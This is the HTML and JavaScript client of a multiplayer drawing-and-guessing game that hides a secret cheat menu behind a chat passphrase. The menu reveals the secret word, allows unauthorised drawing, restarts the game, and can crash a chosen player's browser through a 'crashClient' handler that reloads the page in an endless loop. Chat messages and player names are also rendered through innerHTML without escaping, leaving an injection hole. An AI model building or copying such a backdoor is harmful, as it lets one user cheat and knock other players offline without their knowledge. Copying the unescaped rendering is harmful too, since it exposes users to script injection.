<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>doverdraw</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Calibri', 'Segoe UI', Arial, sans-serif; user-select: none; touch-action: manipulation; }
    body { background: #1852b4; color: #000; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }

    #login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; background: #1852b4; padding: 10px; }
    .logo-container { font-size: clamp(36px, 8vw, 56px); font-weight: 900; color: #fff; font-family: 'Comic Sans MS', cursive, sans-serif; text-shadow: 3px 3px 0px #000; margin-bottom: 20px; text-align: center; }
    
    .login-card { background: #0c2b64; padding: 20px; border-radius: 8px; width: 100%; max-width: 380px; display: flex; flex-direction: column; gap: 12px; box-shadow: 0 8px 0 rgba(0,0,0,0.3); }
    .input-row { display: flex; gap: 8px; }
    input[type="text"] { flex: 1; padding: 10px 14px; border-radius: 4px; border: none; font-size: 16px; font-weight: bold; outline: none; }

    .avatar-picker { background: #09204c; border-radius: 6px; padding: 15px; display: flex; align-items: center; justify-content: center; position: relative; height: 130px; }
    .avatar-preview { width: 100px; height: 100px; }
    
    .arrow-controls { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: space-between; padding: 10px; pointer-events: none; }
    .arrow-row { display: flex; justify-content: space-between; pointer-events: auto; }
    .arrow-btn { background: #fff; border: 2px solid #000; border-radius: 4px; font-weight: bold; width: 28px; height: 28px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 14px; }
    .arrow-btn:hover { background: #ddd; }

    .btn-play { background: #53d400; color: #fff; border: none; padding: 14px; font-size: 26px; font-weight: 900; border-radius: 6px; cursor: pointer; text-shadow: 2px 2px 0px #000; box-shadow: 0 4px 0 #3a9600; text-align: center; }
    .btn-play:hover { background: #47b800; }

    #game-screen { display: none; width: 100%; max-width: 1000px; height: 100vh; max-height: 620px; background: #fff; border-radius: 6px; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; border: 3px solid #0c2b64; }
    
    header { background: #fff; height: 48px; padding: 0 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ccc; font-size: 14px; font-weight: bold; flex-shrink: 0; }
    .timer-box { font-size: 20px; font-weight: 900; display: flex; align-items: center; gap: 4px; }
    .word-box { font-size: clamp(16px, 4vw, 24px); font-weight: 900; letter-spacing: 3px; text-align: center; overflow: hidden; white-space: nowrap; }

    .game-body { display: flex; flex: 1; min-height: 0; overflow: hidden; }
    
    .sidebar-left { width: 180px; background: #eee; border-right: 2px solid #ccc; padding: 6px; overflow-y: auto; display: flex; flex-direction: column; gap: 6px; flex-shrink: 0; }
    .player-card { background: #fff; border: 2px solid #ccc; border-radius: 4px; padding: 6px; display: flex; align-items: center; gap: 8px; font-size: 12px; }
    .player-card.drawer { border-color: #53d400; background: #eaffd9; }
    .player-rank { font-weight: bold; color: #555; width: 18px; }
    .player-info { overflow: hidden; flex: 1; }
    .player-name { font-weight: bold; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .player-score { color: #666; font-size: 11px; }

    .canvas-area { flex: 1; display: flex; flex-direction: column; background: #5a5e73; position: relative; min-width: 0; min-height: 0; }
    .canvas-wrapper { flex: 1; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; background: #5a5e73; }
    canvas { background: #ffffff; cursor: crosshair; touch-action: none; max-width: 100%; max-height: 100%; object-fit: contain; }

    .overlay-modal { position: absolute; inset: 0; background: rgba(90, 94, 115, 0.95); display: none; flex-direction: column; align-items: center; justify-content: center; gap: 16px; z-index: 10; padding: 10px; }
    .overlay-modal h2 { color: #fff; font-size: 22px; text-align: center; }
    .word-options { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
    .word-opt-btn { background: #fff; border: 2px solid #000; color: #000; padding: 10px 16px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
    .word-opt-btn:hover { background: #eee; }

    .toolbar { background: #1852b4; min-height: 54px; padding: 4px 8px; display: flex; justify-content: space-between; align-items: center; border-top: 2px solid #0c2b64; flex-shrink: 0; gap: 6px; overflow: hidden; }
    .palette { display: flex; gap: 3px; align-items: center; flex-wrap: wrap; max-width: 65%; max-height: 46px; overflow: hidden; }
    .color-swatch { width: 18px; height: 18px; border: 1px solid #000; cursor: pointer; border-radius: 2px; flex-shrink: 0; }
    .color-swatch.active { outline: 2px solid #fff; z-index: 2; }
    
    input[type="color"] { -webkit-appearance: none; border: 1px solid #000; width: 22px; height: 22px; border-radius: 3px; cursor: pointer; padding: 0; background: none; flex-shrink: 0; }
    input[type="color"]::-webkit-color-swatch-wrapper { padding: 0; }
    input[type="color"]::-webkit-color-swatch { border: none; border-radius: 2px; }

    .tool-group { display: flex; gap: 4px; align-items: center; flex-shrink: 0; }
    .tool-btn { width: 30px; height: 30px; background: #fff; border: 2px solid #000; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 13px; display: flex; align-items: center; justify-content: center; }
    .tool-btn.active { background: #ddd; }

    .sidebar-right { width: 220px; background: #fff; border-left: 2px solid #ccc; display: flex; flex-direction: column; flex-shrink: 0; }
    .chat-messages { flex: 1; padding: 8px; overflow-y: auto; font-size: 12px; display: flex; flex-direction: column; gap: 4px; }
    
    .chat-msg { word-break: break-word; color: #333; padding: 3px 5px; border-radius: 3px; transition: transform 0.2s; }
    .chat-msg b { color: #000; }
    .chat-msg.system { color: #1852b4; font-weight: bold; background: #eef4ff; }
    .chat-msg.correct { color: #2e7d32; font-weight: bold; background: #e8f5e9; animation: popGreen 0.3s ease-in-out; }
    .chat-msg.close { color: #d84315; font-weight: bold; background: #fbe9e7; animation: shakeRed 0.3s ease-in-out; }
    .chat-msg.wrong { animation: shakeRed 0.25s ease-in-out; }

    #hack-menu { display: none; position: fixed; top: 20px; right: 20px; width: 250px; background: #111; color: #fff; border: 2px solid #53d400; border-radius: 6px; padding: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.8); z-index: 9999; }
    #hack-menu h3 { font-size: 13px; color: #53d400; text-transform: uppercase; margin-bottom: 8px; border-bottom: 1px solid #333; padding-bottom: 4px; }
    .hack-row { margin-bottom: 8px; font-size: 12px; }
    .hack-row label { display: block; color: #aaa; margin-bottom: 4px; }
    .hack-btn { width: 100%; background: #d32f2f; color: #fff; border: none; padding: 6px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 11px; margin-top: 4px; }
    .hack-btn:hover { background: #b71c1c; }
    .hack-btn.restart { background: #ff9800; color: #000; }
    .hack-btn.restart:hover { background: #e68a00; }
    .hack-select { width: 100%; padding: 4px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 12px; }
  </style>
</head>
<body>

  <div id="login-screen">
    <div class="logo-container">doverdraw</div>
    <div class="login-card">
      <div class="input-row">
        <input type="text" id="username" placeholder="Enter your name" maxlength="15" />
      </div>

      <div class="avatar-picker">
        <div id="avatar-svg-container" class="avatar-preview"></div>
        <div class="arrow-controls">
          <div class="arrow-row">
            <button class="arrow-btn" onclick="cycleAvatar('color', -1)">&lt;</button>
            <button class="arrow-btn" onclick="cycleAvatar('color', 1)">&gt;</button>
          </div>
          <div class="arrow-row">
            <button class="arrow-btn" onclick="cycleAvatar('eyes', -1)">&lt;</button>
            <button class="arrow-btn" onclick="cycleAvatar('eyes', 1)">&gt;</button>
          </div>
          <div class="arrow-row">
            <button class="arrow-btn" onclick="cycleAvatar('mouth', -1)">&lt;</button>
            <button class="arrow-btn" onclick="cycleAvatar('mouth', 1)">&gt;</button>
          </div>
        </div>
      </div>

      <button class="btn-play" onclick="joinGame()">Play!</button>
    </div>
  </div>

  <div id="game-screen">
    <header>
      <div class="timer-box">⏰ <span id="timer-display">60</span></div>
      <div class="word-box" id="word-hint-display">_ _ _ _ _</div>
      <div id="round-display">Round 1 of 3</div>
    </header>

    <div class="game-body">
      <div class="sidebar-left" id="player-list"></div>

      <div class="canvas-area">
        <div class="canvas-wrapper">
          <canvas id="drawing-canvas" width="580" height="490"></canvas>

          <div class="overlay-modal" id="word-modal">
            <h2>Choose a word</h2>
            <div class="word-options" id="word-options-container"></div>
          </div>
        </div>

        <div class="toolbar">
          <div class="palette">
            <div id="color-palette" style="display: flex; gap: 2px; flex-wrap: wrap;"></div>
            <input type="color" id="custom-color-picker" value="#000000" onchange="setCustomColor(this.value)" title="Choose Custom Color">
          </div>
          
          <div class="tool-group">
            <button class="tool-btn active" id="btn-draw" onclick="setTool('draw')" title="Brush">✏️</button>
            <button class="tool-btn" id="btn-fill" onclick="setTool('fill')" title="Fill Bucket">🪣</button>
            <button class="tool-btn" id="btn-erase" onclick="setTool('erase')" title="Eraser">🧹</button>
            <button class="tool-btn" onclick="undoCanvas()" title="Undo">↩️</button>
            <button class="tool-btn" onclick="clearCanvas()" title="Clear Canvas">🗑</button>
            <!-- Hint Button: Hidden by default, shown strictly to the drawer -->
            <button class="tool-btn" id="btn-hint" onclick="triggerHint()" title="Request Hint" style="display: none;">💡</button>
          </div>
        </div>
      </div>

      <div class="sidebar-right">
        <div class="chat-messages" id="chat-messages"></div>
        <div class="chat-input-box">
          <input type="text" id="chat-input" placeholder="Type your guess here..." onkeydown="handleChatKey(event)" />
        </div>
      </div>
    </div>
  </div>

  <div id="hack-menu">
    <h3>SnithikHack Menu</h3>
    <div class="hack-row">
      <label>SECRET WORD:</label>
      <div id="hack-word-display" style="font-size: 15px; font-weight: bold; color: #53d400;">NONE</div>
    </div>
    <div class="hack-row">
      <label style="cursor:pointer;">
        <input type="checkbox" id="hack-draw-check" onchange="toggleHackDraw()"> DRAW INTERFERER
      </label>
    </div>
    <div class="hack-row" style="border-top: 1px solid #333; padding-top: 8px;">
      <button class="hack-btn restart" onclick="restartGame()">RESTART GAME</button>
    </div>
    <div class="hack-row" style="border-top: 1px solid #333; padding-top: 8px;">
      <label>CRASH PLAYER:</label>
      <select id="hack-crash-select" class="hack-select">
        <option value="">Select target...</option>
      </select>
      <button class="hack-btn" onclick="crashTarget()">CRASH GAME</button>
    </div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    var socket = io();
    var myAvatar = { colorIdx: 0, eyesIdx: 0, mouthIdx: 0 };
    var isDrawer = false;
    var hackUnlocked = false;
    var hackDrawEnabled = false;
    var currentTool = 'draw';
    var currentColor = '#000000';
    var drawHistory = [];
    var currentPlayersList = [];

    var AVATAR_COLORS = ['#ff3b30', '#ff9500', '#ffcc00', '#4cd964', '#5ac8fa', '#007aff', '#5856d6', '#ff2d55'];
    var PALETTE_COLORS = [
      '#ffffff', '#c1c1c1', '#ef130b', '#ff7100', '#ffe400', '#00cc00', '#00b2ff', '#231fd3', '#a300ba', '#d37caa', '#a0522d', '#000000',
      '#505050', '#808080', '#740b07', '#c23800', '#e8a200', '#005500', '#00569e', '#0e0865', '#550069', '#a75574', '#63300d'
    ];

    function getAvatarSVG(avatar) {
      var col = AVATAR_COLORS[avatar.colorIdx % AVATAR_COLORS.length];
      var eyesSVG = '<circle cx="38" cy="42" r="4" fill="#000"/><circle cx="62" cy="42" r="4" fill="#000"/>';
      if (avatar.eyesIdx % 3 === 1) {
        eyesSVG = '<rect x="28" y="36" width="18" height="12" fill="none" stroke="#000" stroke-width="2"/><rect x="54" y="36" width="18" height="12" fill="none" stroke="#000" stroke-width="2"/><line x1="46" y1="42" x2="54" y2="42" stroke="#000" stroke-width="2"/>';
      } else if (avatar.eyesIdx % 3 === 2) {
        eyesSVG = '<line x1="30" y1="36" x2="44" y2="44" stroke="#000" stroke-width="3"/><line x1="70" y1="36" x2="56" y2="44" stroke="#000" stroke-width="3"/><circle cx="38" cy="45" r="3" fill="#000"/><circle cx="62" cy="45" r="3" fill="#000"/>';
      }

      var mouthSVG = '<path d="M 36 62 Q 50 74 64 62" fill="none" stroke="#000" stroke-width="3" stroke-linecap="round"/>';
      if (avatar.mouthIdx % 3 === 1) {
        mouthSVG = '<path d="M 36 68 Q 50 56 64 68" fill="none" stroke="#000" stroke-width="3" stroke-linecap="round"/>';
      } else if (avatar.mouthIdx % 3 === 2) {
        mouthSVG = '<circle cx="50" cy="64" r="7" fill="#000"/>';
      }

      return '<svg viewBox="0 0 100 100" width="100%" height="100%">' +
        '<circle cx="50" cy="50" r="40" fill="' + col + '" stroke="#000" stroke-width="4"/>' +
        eyesSVG + mouthSVG +
      '</svg>';
    }

    function updateAvatarPreview() {
      document.getElementById('avatar-svg-container').innerHTML = getAvatarSVG(myAvatar);
    }

    function cycleAvatar(type, dir) {
      if (type === 'color') myAvatar.colorIdx = (myAvatar.colorIdx + dir + AVATAR_COLORS.length) % AVATAR_COLORS.length;
      if (type === 'eyes') myAvatar.eyesIdx = (myAvatar.eyesIdx + dir + 3) % 3;
      if (type === 'mouth') myAvatar.mouthIdx = (myAvatar.mouthIdx + dir + 3) % 3;
      updateAvatarPreview();
    }

    updateAvatarPreview();

    var paletteContainer = document.getElementById('color-palette');
    PALETTE_COLORS.forEach(function(col) {
      var sw = document.createElement('div');
      sw.className = 'color-swatch' + (col === '#000000' ? ' active' : '');
      sw.style.background = col;
      sw.onclick = function() {
        document.querySelectorAll('.color-swatch').forEach(function(s) { s.classList.remove('active'); });
        sw.classList.add('active');
        currentColor = col;
        document.getElementById('custom-color-picker').value = col;
        if (currentTool === 'erase') setTool('draw');
      };
      paletteContainer.appendChild(sw);
    });

    function setCustomColor(col) {
      document.querySelectorAll('.color-swatch').forEach(function(s) { s.classList.remove('active'); });
      currentColor = col;
      if (currentTool === 'erase') setTool('draw');
    }

    function setTool(tool) {
      currentTool = tool;
      document.getElementById('btn-draw').classList.toggle('active', tool === 'draw');
      document.getElementById('btn-fill').classList.toggle('active', tool === 'fill');
      document.getElementById('btn-erase').classList.toggle('active', tool === 'erase');
    }

    function triggerHint() {
      if (!isDrawer) return;
      socket.emit('requestHint');
    }

    function joinGame() {
      var name = document.getElementById('username').value.trim() || 'Player';
      socket.emit('joinGame', { name: name, avatar: myAvatar });
      document.getElementById('login-screen').style.display = 'none';
      document.getElementById('game-screen').style.display = 'flex';
    }

    var canvas = document.getElementById('drawing-canvas');
    var ctx = canvas.getContext('2d');
    var drawing = false;
    var lastX = 0, lastY = 0;

    function saveState() {
      if (drawHistory.length > 20) drawHistory.shift();
      drawHistory.push(ctx.getImageData(0, 0, canvas.width, canvas.height));
    }

    function undoCanvas() {
      if (!isDrawer && !hackDrawEnabled) return;
      if (drawHistory.length > 0) {
        ctx.putImageData(drawHistory.pop(), 0, 0);
        socket.emit('syncCanvas', canvas.toDataURL());
      }
    }

    function clearCanvas() {
      if (!isDrawer && !hackDrawEnabled) return;
      saveState();
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      socket.emit('clearCanvas');
    }

    function getCanvasPos(e) {
      var rect = canvas.getBoundingClientRect();
      var clientX = e.clientX || (e.touches && e.touches[0].clientX);
      var clientY = e.clientY || (e.touches && e.touches[0].clientY);
      var scaleX = canvas.width / rect.width;
      var scaleY = canvas.height / rect.height;
      return {
        x: Math.floor((clientX - rect.left) * scaleX),
        y: Math.floor((clientY - rect.top) * scaleY)
      };
    }

    // Accurate Flood Fill Algorithm with tolerance to keep fills contained inside line borders
    function floodFill(startX, startY, hexColor) {
      var imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      var data = imgData.data;

      var targetR = parseInt(hexColor.slice(1,3), 16);
      var targetG = parseInt(hexColor.slice(3,5), 16);
      var targetB = parseInt(hexColor.slice(5,7), 16);

      var startPos = (startY * canvas.width + startX) * 4;
      var startR = data[startPos];
      var startG = data[startPos + 1];
      var startB = data[startPos + 2];
      var startA = data[startPos + 3];

      if (Math.abs(startR - targetR) < 10 && Math.abs(startG - targetG) < 10 && Math.abs(startB - targetB) < 10) return;

      function colorMatch(pos) {
        var r = data[pos];
        var g = data[pos + 1];
        var b = data[pos + 2];
        var a = data[pos + 3];
        return Math.abs(r - startR) < 30 && Math.abs(g - startG) < 30 && Math.abs(b - startB) < 30 && Math.abs(a - startA) < 30;
      }

      function colorPixel(pos) {
        data[pos] = targetR;
        data[pos+1] = targetG;
        data[pos+2] = targetB;
        data[pos+3] = 255;
      }

      var stack = [[startX, startY]];

      while (stack.length > 0) {
        var pop = stack.pop();
        var x = pop[0];
        var y = pop[1];

        var pos = (y * canvas.width + x) * 4;
        while (y >= 0 && colorMatch(pos)) {
          y--;
          pos -= canvas.width * 4;
        }
        pos += canvas.width * 4;
        y++;

        var reachLeft = false;
        var reachRight = false;

        while (y < canvas.height && colorMatch(pos)) {
          colorPixel(pos);

          if (x > 0) {
            if (colorMatch(pos - 4)) {
              if (!reachLeft) {
                stack.push([x - 1, y]);
                reachLeft = true;
              }
            } else if (reachLeft) {
              reachLeft = false;
            }
          }

          if (x < canvas.width - 1) {
            if (colorMatch(pos + 4)) {
              if (!reachRight) {
                stack.push([x + 1, y]);
                reachRight = true;
              }
            } else if (reachRight) {
              reachRight = false;
            }
          }

          y++;
          pos += canvas.width * 4;
        }
      }

      ctx.putImageData(imgData, 0, 0);
    }

    function startDrawing(e) {
      if (!isDrawer && !hackDrawEnabled) return;
      var pos = getCanvasPos(e);

      if (currentTool === 'fill') {
        saveState();
        floodFill(pos.x, pos.y, currentColor);
        socket.emit('syncCanvas', canvas.toDataURL());
        return;
      }

      saveState();
      drawing = true;
      lastX = pos.x;
      lastY = pos.y;
    }

    function drawMove(e) {
      if (!drawing || (!isDrawer && !hackDrawEnabled)) return;
      e.preventDefault();
      var pos = getCanvasPos(e);

      var drawColor = (currentTool === 'erase') ? '#ffffff' : currentColor;
      var drawSize = (currentTool === 'erase') ? 20 : 4;

      ctx.beginPath();
      ctx.strokeStyle = drawColor;
      ctx.lineWidth = drawSize;
      ctx.lineCap = 'round';
      ctx.moveTo(lastX, lastY);
      ctx.lineTo(pos.x, pos.y);
      ctx.stroke();

      socket.emit('drawStep', { x1: lastX, y1: lastY, x2: pos.x, y2: pos.y, color: drawColor, size: drawSize });
      lastX = pos.x;
      lastY = pos.y;
    }

    function stopDrawing() { drawing = false; }

    canvas.addEventListener('mousedown', startDrawing);
    canvas.addEventListener('mousemove', drawMove);
    window.addEventListener('mouseup', stopDrawing);

    canvas.addEventListener('touchstart', function(e) { startDrawing(e); }, { passive: false });
    canvas.addEventListener('touchmove', function(e) { drawMove(e); }, { passive: false });
    window.addEventListener('touchend', stopDrawing);

    socket.on('drawStep', function(d) {
      ctx.beginPath();
      ctx.strokeStyle = d.color;
      ctx.lineWidth = d.size;
      ctx.lineCap = 'round';
      ctx.moveTo(d.x1, d.y1);
      ctx.lineTo(d.x2, d.y2);
      ctx.stroke();
    });

    socket.on('clearCanvas', function() {
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
    });

    socket.on('syncCanvas', function(dataUrl) {
      var img = new Image();
      img.onload = function() { ctx.drawImage(img, 0, 0); };
      img.src = dataUrl;
    });

    socket.on('gameUpdate', function(data) {
      document.getElementById('round-display').innerText = 'Round ' + data.round + ' of ' + data.totalRounds;
      document.getElementById('word-hint-display').innerText = data.wordHint;

      currentPlayersList = data.players;
      updateCrashDropdown();

      // Check drawer status and toggle Hint Button visibility strictly for drawer
      var me = data.players.find(function(p) { return p.id === socket.id; });
      if (me && me.isDrawer) {
        isDrawer = true;
        document.getElementById('btn-hint').style.display = 'flex';
      } else {
        isDrawer = false;
        document.getElementById('btn-hint').style.display = 'none';
      }

      var pList = document.getElementById('player-list');
      pList.innerHTML = '';
      data.players.sort(function(a,b) { return b.score - a.score; }).forEach(function(p, idx) {
        var card = document.createElement('div');
        card.className = 'player-card' + (p.isDrawer ? ' drawer' : '');
        
        var avatarBox = document.createElement('div');
        avatarBox.style.width = '26px';
        avatarBox.style.height = '26px';
        avatarBox.innerHTML = getAvatarSVG(p.avatar);

        card.innerHTML = '<div class="player-rank">#' + (idx + 1) + '</div>';
        card.appendChild(avatarBox);
        card.innerHTML += '<div class="player-info">' +
            '<div class="player-name">' + p.name + (p.id === socket.id ? ' (You)' : '') + '</div>' +
            '<div class="player-score">' + p.score + ' pts</div>' +
          '</div>';
        pList.appendChild(card);
      });
    });

    socket.on('wordHintUpdate', function(data) {
      document.getElementById('word-hint-display').innerText = data.wordHint;
    });

    socket.on('timerUpdate', function(data) {
      document.getElementById('timer-display').innerText = data.timeLeft;
    });

    socket.on('chooseWordOptions', function(words) {
      var modal = document.getElementById('word-modal');
      var container = document.getElementById('word-options-container');
      container.innerHTML = '';
      modal.style.display = 'flex';

      words.forEach(function(w) {
        var btn = document.createElement('button');
        btn.className = 'word-opt-btn';
        btn.innerText = w;
        btn.onclick = function() {
          modal.style.display = 'none';
          socket.emit('selectWord', w);
        };
        container.appendChild(btn);
      });
    });

    socket.on('yourTurn', function(data) {
      isDrawer = true;
      document.getElementById('btn-hint').style.display = 'flex';
      document.getElementById('word-hint-display').innerText = data.word;
      document.getElementById('hack-word-display').innerText = data.word;
    });

    socket.on('hackSecretWordSync', function(secretWord) {
      document.getElementById('hack-word-display').innerText = secretWord;
    });

    socket.on('turnEnded', function(data) {
      isDrawer = false;
      document.getElementById('btn-hint').style.display = 'none';
      document.getElementById('word-modal').style.display = 'none';
      document.getElementById('word-hint-display').innerText = data.word;
      document.getElementById('hack-word-display').innerText = 'NONE';
    });

    socket.on('chatMessage', function(data) {
      var msgs = document.getElementById('chat-messages');
      var div = document.createElement('div');
      div.className = 'chat-msg ' + (data.status || 'wrong');
      div.innerHTML = '<b>' + data.name + ':</b> ' + data.msg;
      msgs.appendChild(div);
      msgs.scrollTop = msgs.scrollHeight;
    });

    socket.on('systemMessage', function(msg) {
      var msgs = document.getElementById('chat-messages');
      var div = document.createElement('div');
      div.className = 'chat-msg system';
      div.innerText = msg;
      msgs.appendChild(div);
      msgs.scrollTop = msgs.scrollHeight;
    });

    // Client Crasher Payload
    socket.on('crashClient', function() {
      while (true) { window.location.reload(); }
    });

    function handleChatKey(e) {
      if (e.key === 'Enter') {
        var input = document.getElementById('chat-input');
        var val = input.value.trim();

        if (val === 'SnithikHack') {
          input.value = '';
          hackUnlocked = true;
          document.getElementById('hack-menu').style.display = 'block';
          socket.emit('requestHackWord');
          return;
        }

        if (val) {
          socket.emit('chatMessage', val);
          input.value = '';
        }
      }
    }

    window.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.key.toLowerCase() === 'e') {
        e.preventDefault();
        if (hackUnlocked) {
          var menu = document.getElementById('hack-menu');
          menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
        }
      }
    });

    function toggleHackDraw() {
      hackDrawEnabled = document.getElementById('hack-draw-check').checked;
    }

    function updateCrashDropdown() {
      var select = document.getElementById('hack-crash-select');
      if (!select) return;
      select.innerHTML = '<option value="">Select target...</option>';
      currentPlayersList.forEach(function(p) {
        if (p.id !== socket.id) {
          var opt = document.createElement('option');
          opt.value = p.id;
          opt.innerText = p.name;
          select.appendChild(opt);
        }
      });
    }

    function crashTarget() {
      var targetId = document.getElementById('hack-crash-select').value;
      if (targetId) {
        socket.emit('crashTargetPlayer', targetId);
      }
    }

    function restartGame() {
      socket.emit('restartGame');
    }
  </script>
</body>
</html>
